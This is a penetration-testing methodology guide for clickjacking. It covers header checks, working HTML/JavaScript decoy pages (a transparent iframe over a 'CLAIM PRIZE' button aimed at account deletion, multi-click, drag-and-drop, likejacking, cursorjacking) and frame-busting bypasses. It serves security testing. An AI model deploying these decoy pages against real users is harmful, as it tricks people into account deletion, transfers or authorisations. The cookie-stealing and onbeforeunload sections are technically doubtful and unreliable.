# Clickjacking Testing Methodology

## Quick Reference

**Vulnerable if:**
- No `X-Frame-Options` header
- No `frame-ancestors` CSP directive
- Weak frame-ancestors (allows attacker origin)

**Test:**
```html
<iframe src="https://target.com/sensitive-action"></iframe>
```

---

## Clickjacking Basics

Clickjacking tricks users into clicking on hidden elements by:
1. Embedding target page in transparent iframe
2. Overlaying attacker's content
3. User thinks they're clicking attacker's UI but clicks target's

---

## Detection

### Check Response Headers

```bash
curl -I https://target.com
```

Look for:
```
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: frame-ancestors 'self'
```

### Vulnerability Indicators

**Vulnerable:**
- No framing headers
- `X-Frame-Options: ALLOW-FROM` (deprecated, not widely supported)
- `frame-ancestors *`
- `frame-ancestors https://attacker.com`

**Not Vulnerable:**
- `X-Frame-Options: DENY`
- `X-Frame-Options: SAMEORIGIN`
- `frame-ancestors 'none'`
- `frame-ancestors 'self'`

---

## Basic PoC

### Simple Frame Test

```html
<!DOCTYPE html>
<html>
<head>
  <title>Clickjacking PoC</title>
</head>
<body>
  <h1>Can this page be framed?</h1>
  <iframe src="https://target.com/sensitive-action"
          width="800" height="600"></iframe>
</body>
</html>
```

If page loads in iframe, it's potentially vulnerable.

---

## Exploitation PoCs

### Basic Clickjacking

```html
<!DOCTYPE html>
<html>
<head>
  <title>Win a Prize!</title>
  <style>
    iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 800px;
      height: 600px;
      opacity: 0.0001;  /* Nearly invisible */
      z-index: 2;
    }
    button {
      position: absolute;
      top: 200px;
      left: 300px;
      z-index: 1;
      padding: 20px;
      font-size: 20px;
    }
  </style>
</head>
<body>
  <h1>Click to Win!</h1>
  <button>CLAIM PRIZE</button>
  <iframe src="https://target.com/delete-account"></iframe>
</body>
</html>
```

### Multi-Click Attack

For actions requiring multiple clicks:

```html
<!DOCTYPE html>
<html>
<head>
  <style>
    iframe {
      position: absolute;
      opacity: 0.0001;
      z-index: 2;
    }
    .step { display: none; }
    .step.active { display: block; }
  </style>
</head>
<body>
  <div class="step active" id="step1">
    <h1>Step 1: Click Start</h1>
    <button onclick="nextStep()">START</button>
  </div>
  <div class="step" id="step2">
    <h1>Step 2: Confirm</h1>
    <button onclick="nextStep()">CONFIRM</button>
  </div>
  <iframe src="https://target.com/action"></iframe>

  <script>
    let step = 1;
    function nextStep() {
      document.getElementById('step' + step).classList.remove('active');
      step++;
      document.getElementById('step' + step).classList.add('active');
      // Reposition iframe for next click
      document.querySelector('iframe').style.top = (step * 100) + 'px';
    }
  </script>
</body>
</html>
```

### Drag and Drop Hijacking

```html
<!DOCTYPE html>
<html>
<head>
  <style>
    iframe {
      position: absolute;
      opacity: 0.0001;
      z-index: 2;
      pointer-events: none;
    }
    .draggable {
      width: 100px;
      height: 100px;
      background: blue;
      cursor: move;
    }
    .dropzone {
      width: 200px;
      height: 200px;
      border: 2px dashed gray;
    }
  </style>
</head>
<body>
  <div class="draggable" draggable="true">Drag Me</div>
  <div class="dropzone">Drop Here</div>
  <iframe src="https://target.com/sensitive-page"></iframe>
</body>
</html>
```

---

## Frame Busting Bypass

### JavaScript Frame Busting

Common frame busters:
```javascript
if (top != self) { top.location = self.location; }
if (window != window.top) { window.top.location = window.location; }
```

**Bypass with sandbox:**
```html
<iframe src="https://target.com" sandbox="allow-forms"></iframe>
```

`sandbox` prevents JavaScript execution, breaking frame buster.

**Bypass with double framing:**
```html
<!-- Attacker's page -->
<iframe src="middle.html"></iframe>

<!-- middle.html -->
<iframe src="https://target.com"></iframe>
```

### OnBeforeUnload Bypass

If target uses `onbeforeunload`:
```html
<iframe src="https://target.com"
        sandbox="allow-forms allow-scripts allow-same-origin"
        onload="this.contentWindow.onbeforeunload=null">
</iframe>
```

### X-Frame-Options Inconsistency

Some pages might not have protection:
- Error pages
- Login pages
- Specific endpoints
- Different response codes

---

## Sandbox Attribute Values

Control iframe capabilities:

```html
<!-- Most restrictive -->
<iframe src="..." sandbox=""></iframe>

<!-- Allow forms (for clickjacking form submissions) -->
<iframe src="..." sandbox="allow-forms"></iframe>

<!-- Allow scripts (may enable frame busting) -->
<iframe src="..." sandbox="allow-scripts"></iframe>

<!-- Allow same-origin (may enable frame busting) -->
<iframe src="..." sandbox="allow-same-origin"></iframe>

<!-- Combination -->
<iframe src="..." sandbox="allow-forms allow-scripts"></iframe>
```

---

## High-Impact Targets

### State-Changing Actions
- Delete account
- Change password
- Change email
- Transfer money
- Authorize OAuth

### Sensitive Clicks
- Approve requests
- Enable features
- Disable security

### Form Submissions
- Auto-fill + click submit
- Hidden form manipulation

---

## Likejacking

Clickjacking on social media:
```html
<iframe src="https://facebook.com/plugins/like.php?href=attacker-page"
        style="opacity:0; position:absolute;">
</iframe>
<button style="position:absolute;">Click for Prize!</button>
```

---

## Cursorjacking

Manipulate cursor position:
```css
body { cursor: none; }
.fake-cursor {
  position: fixed;
  pointer-events: none;
  background: url('cursor.png');
  width: 32px;
  height: 32px;
}
```

```javascript
document.addEventListener('mousemove', (e) => {
  fakeCursor.style.left = (e.clientX + 200) + 'px';
  fakeCursor.style.top = (e.clientY + 200) + 'px';
});
```

User sees cursor 200px offset from actual position.

---

## Cookie-Based Attacks

### Stealing Cookies via Clickjacking

If target has `SameSite=None` or `SameSite=Lax` with GET:
```html
<iframe src="https://target.com/api/user-data"></iframe>
```

Then use JavaScript in attacker page to read iframe contents (if same-origin or CORS allows).

---

## Testing Workflow

1. **Check framing headers:**
   - X-Frame-Options
   - CSP frame-ancestors

2. **Test basic framing:**
   - Create simple iframe PoC
   - Check if page loads

3. **Identify sensitive actions:**
   - Single-click actions
   - Form submissions
   - Multi-step processes

4. **Build exploitation PoC:**
   - Position iframe over decoy element
   - Match click coordinates

5. **Bypass protections:**
   - Try sandbox attribute
   - Check inconsistent protection

---

## Verification Checklist

1. **Check for protection:**
   - [ ] X-Frame-Options header
   - [ ] CSP frame-ancestors
   - [ ] JavaScript frame busters

2. **Test framing:**
   - [ ] Basic iframe test
   - [ ] Sandbox bypass if needed

3. **Identify target action:**
   - [ ] Sensitive state-changing action
   - [ ] Single-click exploitable

4. **Create PoC:**
   - [ ] Transparent iframe
   - [ ] Decoy element positioning
   - [ ] Working click alignment

5. **Document evidence:**
   - [ ] PoC HTML file
   - [ ] Screenshot of layered attack
   - [ ] Impact description
